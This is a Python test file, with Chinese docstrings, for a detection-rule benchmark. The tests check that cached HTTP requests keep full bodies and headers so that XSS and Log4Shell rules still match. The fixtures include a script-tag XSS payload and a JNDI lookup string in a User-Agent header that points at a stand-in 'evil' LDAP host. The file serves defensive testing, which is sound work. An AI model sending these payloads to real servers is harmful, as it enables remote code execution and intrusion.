"""`bench/run_rule_cost.py` 的口径守卫。

这个脚本的全部价值在「数得准」：它报的误报数是「这条规则能不能合入」的
决策依据。所以它自己的失效模式必须有测试守着，而不是靠人多看两眼。

v2.0 真实踩过一次：第一版给缓存里的 body 加了 1000 字符上限，理由写得很像
回事——「正常请求体远小于此，截断只会让误报少算，保守」。结果周一那 3 条
`POST /ar.logger.php`（content-length 18,856，`<script>` 在 URL 编码的广告
素材里很靠后）一条都没命中，脚本报出 **「真误报 0」**。

**一个让人安心的假结果，比一个刺眼的结果危险。** 评测工具漏算误报，会让
「先量代价、再写规则」这套流程变成自我安慰——你以为量过了，其实没量到。
所以这里守两件事：

1. 缓存必须存**完整** body（否则长 body 里的载荷永远数不到）；
2. 从缓存重建的事件必须与生产 `_build_event()` 判定一致（否则量的是另一份
   代码的行为，数字再准也没有意义）。
"""
from __future__ import annotations

import gzip
import json
import sys
from datetime import datetime
from pathlib import Path
from types import SimpleNamespace

import pytest

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))

from bench import run_benchmark as rb  # noqa: E402
from bench import run_rule_cost as rc  # noqa: E402
from engine.detector import _matches, load_rules_dir  # noqa: E402


class _Ev:
    """够 `build_cache` 用的事件壳子（只需要这些字段）。"""

    def __init__(self, body: str, ts: float = 1499088067.0) -> None:
        self.ts = datetime.fromtimestamp(ts)
        self.ip = "192.168.10.5"
        self.port = 51234
        self.body = body
        self.raw = ("POST /ar.logger.php HTTP/1.1\r\n"
                    "Host: logs.clrsrv.com\r\n"
                    f"Content-Length: {len(body)}\r\n\r\n")


def _cache_one(tmp_path: Path, monkeypatch, body: str) -> dict:
    """把单个事件写进临时缓存，返回落盘的那一行。"""
    monkeypatch.setattr(rc, "DEFAULT_CACHE", tmp_path)
    monkeypatch.setattr(rc, "iter_events", lambda pcap: [_Ev(body)])
    # Labels 只在建缓存时用来打 expect/attack 标记，这里不关心，给个恒 benign 的壳
    monkeypatch.setattr(
        rb.Labels, "load",
        classmethod(lambda cls, path: SimpleNamespace(
            verdict=lambda event: ("benign", ""))))
    corpus = rc.Corpus("probe", tmp_path / "x.pcap", tmp_path / "labels.json")
    n = rc.build_cache(corpus)
    assert n == 1
    with gzip.open(corpus.cache_file, "rt", encoding="utf-8") as fh:
        return json.loads(fh.readline())


def test_cache_keeps_the_whole_body(tmp_path, monkeypatch):
    """body 不许截断：载荷可能在第 18,000 个字符上。

    这条测试的存在理由就是 v2.0 那个 bug——截断后脚本报「真误报 0」，
    而归档报告写着周一 FP 3。
    """
    payload = "<script>alert(1)</script>"
    body = "a" * 20_000 + payload
    row = _cache_one(tmp_path, monkeypatch, body)

    assert len(row["body"]) == len(body), "缓存不能截断 body"
    assert row["body"].endswith(payload)


def test_rebuilt_event_matches_production(tmp_path, monkeypatch):
    """缓存 → rebuild 出来的事件，必须能被生产判据命中。

    `rebuild` 走的就是生产 `_build_event()`；这条测试守的是「原料够不够
    重建出同一个事件」——body 被截断、头部被丢掉，都会在这里现形。
    """
    payload = "<script>alert(1)</script>"
    row = _cache_one(tmp_path, monkeypatch, "a" * 20_000 + payload)
    event = rc.rebuild(row)

    xss = [r for r in load_rules_dir(ROOT / "rules")
           if r.id == "http-xss-script-injection"][0]
    assert _matches(event, xss.match), "长 body 末尾的载荷必须仍然命中"


def test_headers_reach_the_event(tmp_path, monkeypatch):
    """头部也要完整：JNDI / XSS 载荷常放在 User-Agent、Referer 里。

    只存 URI 会系统性低估误报——规则在 UA 上误命中，这里看不见。
    """
    monkeypatch.setattr(rc, "DEFAULT_CACHE", tmp_path)
    ev = _Ev('x=1')
    ev.raw = ("POST /x HTTP/1.1\r\n"
              "Host: h\r\n"
              "User-Agent: ${jndi:ldap://evil/a}\r\n\r\n")
    monkeypatch.setattr(rc, "iter_events", lambda pcap: [ev])
    monkeypatch.setattr(
        rb.Labels, "load",
        classmethod(lambda cls, path: SimpleNamespace(
            verdict=lambda event: ("benign", ""))))
    corpus = rc.Corpus("probe", tmp_path / "x.pcap", tmp_path / "labels.json")
    rc.build_cache(corpus)
    with gzip.open(corpus.cache_file, "rt", encoding="utf-8") as fh:
        row = json.loads(fh.readline())

    assert "jndi" in (row["head"] or "").lower()
    jndi = [r for r in load_rules_dir(ROOT / "rules")
            if r.id == "http-log4shell-jndi"][0]
    assert _matches(rc.rebuild(row), jndi.match), "UA 里的载荷必须进判据视图"


@pytest.mark.parametrize("field", ["line", "head", "body"])
def test_cache_row_has_the_raw_material(tmp_path, monkeypatch, field):
    """原料字段齐不齐：缺一个，rebuild 出来的就不是同一个请求。"""
    row = _cache_one(tmp_path, monkeypatch, "a=1")
    assert row.get(field) is not None
